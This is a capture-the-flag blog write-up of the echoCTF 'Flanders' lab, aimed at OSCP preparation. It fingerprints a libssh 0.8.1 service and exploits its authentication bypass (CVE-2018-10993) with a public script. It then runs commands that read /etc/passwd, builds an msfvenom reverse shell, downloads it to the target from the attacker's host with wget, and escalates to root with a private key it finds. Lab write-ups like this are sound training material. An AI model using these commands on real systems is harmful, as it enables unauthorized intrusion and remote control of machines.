---
title: "echoCTF Flanders Writeup: Vulnerable SSH version to Root"
date: 2025-06-25
categories: ["CTF", "OSCP Prep", "echoCTF"]
tags: ["Authentication Bypass", "Linux", "privilege escalation", "Public Exploit"]
description: "Step-by-step guide to cracking Flanders on echoCTF with SSH Authentication Bypass. Perfect for OSCP prep!"
---

## Video Walkthrough

{{< youtube HwbOIk1GpUw >}}

[![Watch on YouTube](https://img.shields.io/badge/Watch%20on-YouTube-red?logo=youtube)](https://www.youtube.com/watch?v=HwbOIk1GpUw)

# Flanders

# Enumeration

## NMAP Port Scan

```bash
sudo nmap -vv -p- 10.0.50.0 -T4 -sC -sV -oA nmap/allports
```
## Output
```bash
PORT     STATE SERVICE REASON         VERSION
6022/tcp open  ssh     syn-ack ttl 63 libssh 0.8.1 (protocol 2.0)
| ssh-hostkey: 
|   2048 9c:42:2e:fa:60:30:95:dd:a0:60:80:1f:fd:ae:77:86 (RSA)
|_ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDF7bYwrFoV/ukt+Dv8+2ZbdxEoyYGkvq8tEO7cbR9jTl96QN//1v8lOw4o0b26uA7wHBWs5+zPZm6SeGIazx+Bj3mih6Oofm/9HU+FLHTCb+uo5kaG6v8g7gwjkoFNyx/rn+G+BKAMY6op4+6P6CqFFv1yfEhVWWqItla0kmfp3jwD1HCd/i0OxFsUN335RYeokeLqrG1kpoyVlsiqHMZWbz7DUDE2BjTVy1WcZAJtukCa7OHJKMZuh/AVCrCUuTrA3TRHJdl4+AR1GpI+UscHwmwZRsRsVAwgjC7v93fdD+zmrTth15XH7vXYkUK/ZAyaK8cAJOg2lCeNCwuw5OWh
```

Analyzing the NMAP output we can see that we found port 6022 open, and it seems that is SSH. We can also view the version of the SSH service (libss 0.8.1).

To confirm that this is actually the version of the SSH server we can furter fingerprint the service using `nc`

```bash
nc -nvC 10.0.50.0 6022
```
## Output
```bash
(UNKNOWN) [10.0.50.0] 6022 (?) open
SSH-2.0-libssh_0.8.1
```

Now that we have the version of the SSH we can search for known vulnerabilities on the web. What i usually do when i search for vulnerabilities for a specific software or service, is that i append the keywords "poc" "exploit" "github" prepending the version number and service name

![Image Description](/images/Pasted%20image%2020250729180313.png)

We can see that there are a lot of exploits available regarding this particular version of and most importantly we get the CVE number to search more specifically.

![Image Description](/images/Pasted%20image%2020250729190217.png)

The following exploit worked for me: `https://gist.github.com/mgeeky/a7271536b1d815acfb8060fd8b65bd5d?permalink_comment_id=3077048`

# Exploitation

We can download the GitHub repo and install the requirements for the exploit to work.
First lets copy the exploit by clicking the raw format and paste it locally on our attacking machine:

```bash
cat sshlibexp.py

#!/usr/bin/python3

#
# CVE-2018-10993 libSSH authentication bypass exploit...
<snip>
```

Reading the script we can see that there is a python module required called `paramiko` and since is a python script it is a good practice to create a python virtual environment to install what is required.

![Image Description](/images/Pasted%20image%2020250729191121.png)

```bash
sudo apt install python3-venv

python3 -m venv .venv

source .venv/bin/activate

python3 -m pip install paramiko

python3 sshlibexp.py 10.0.50.0 -p 6022 -c "cat /etc/passwd"
```

![Image Description](/images/Pasted%20image%2020250729191351.png)

We get an error but the script rans successfully. We now have command execution on the target server.

Lets get a reverse shell..

Lets first check the architecture of the target server so we know what kind of architecture should our shell be.

```bash
python3 sshlibexp.py 10.0.50.0 -p 6022 -c "uname -a"
```

![Image Description](/images/Pasted%20image%2020250729191850.png)
Is a x64 architecture so lets create an x64 reverse shell using `msfvenom` and then download our rshell to the target machine using `wget`

```bash
sudo msfvenom -p linux/x64/shell_reverse_tcp LHOST=<attacker-ip> LPORT=80 -f elf -o x64

python3 -m http.server 80

python3 sshlibexp.py 10.0.50.0 -p 6022 -c "wget http://10.10.11.150/x64 -O /tmp/x64" 
```

![Image Description](/images/Pasted%20image%2020250729192359.png)

Now that our rshell is downloaded we can go ahead and use `chmod` to make it executable and then execute the rshell

```bash
python3 sshlibexp.py 10.0.50.0 -p 6022 -c "chmod +x /tmp/x64"

sudo nc -nvlp 80

python3 sshlibexp.py 10.0.50.0 -p 6022 -c "/tmp/x64"
```

![Image Description](/images/Pasted%20image%2020250729192554.png)

We got in!

To have a better shell we can use python3 likewise:

```bash
python3 -c "import pty;pty.spawn('/bin/bash')"

Ctr+Z

stty raw -echo;fg
(Press Enter)
(Press Enter)
(Press Enter)

export TERM=xterm
```

![Image Description](/images/Pasted%20image%2020250729193212.png)

Now we have a fully functional shell!

# Privilege Escalation

Most of the times i check for sudo privileges or SUID binaries however in this case by checking what is running locally on the box we find out that there is an SSH service running locally.

```bash
ss -antp
```

![Image Description](/images/Pasted%20image%2020250729194000.png)

 Trying to access the local SSH service as root with the password give in the  hint but we get access denied
![Image Description](/images/Pasted%20image%2020250729194102.png)

```bash
ssh root@127.0.01
OkilyDokily
```

Looking further around knowing we are dealing with an SSH service, it is noticed that there is private key under the home directory of ETSCTF user called "mykey" and its owned by root!

![Image Description](/images/Pasted%20image%2020250729194808.png)

We can try using the private key to access the SSH server locally as root!

```bash
ETSCTF@flanders:/home/ETSCTF/.ssh$ ssh -i mykey root@127.0.01
```

![Image Description](/images/Pasted%20image%2020250729194833.png)

ROOT!